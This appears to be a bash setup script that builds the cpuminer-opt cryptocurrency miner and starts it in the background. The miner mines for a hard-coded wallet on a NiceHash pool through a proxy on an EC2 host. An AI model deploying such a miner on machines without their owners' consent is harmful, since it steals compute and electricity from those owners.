#!/bin/bash

sudo apt-get update

sudo apt-get install libmpc-dev make -y
sudo apt-get install autotools-dev -y
sudo apt-get install automake -y
sudo apt-get install libssl-dev -y
sudo apt-get install curl -y
sudo apt-get install build-essential -y
sudo apt-get install libcurl4-openssl-dev -y

cd /
git clone --recursive https://github.com/JayDDee/cpuminer-opt.git
cd /cpuminer-opt
ln -s /usr/include/curl curl

sudo ./autogen.sh
sudo ./build.sh
nohup ./cpuminer -a cryptonight  -o stratum+tcp://cryptonight.eu.nicehash.com:3355 -u  15C2WyRMqCTjJzzuch6dPQjtgZdoiK63ew -p x -x ec2-52-56-236-53.eu-west-2.compute.amazonaws.com:9999 --randomize &
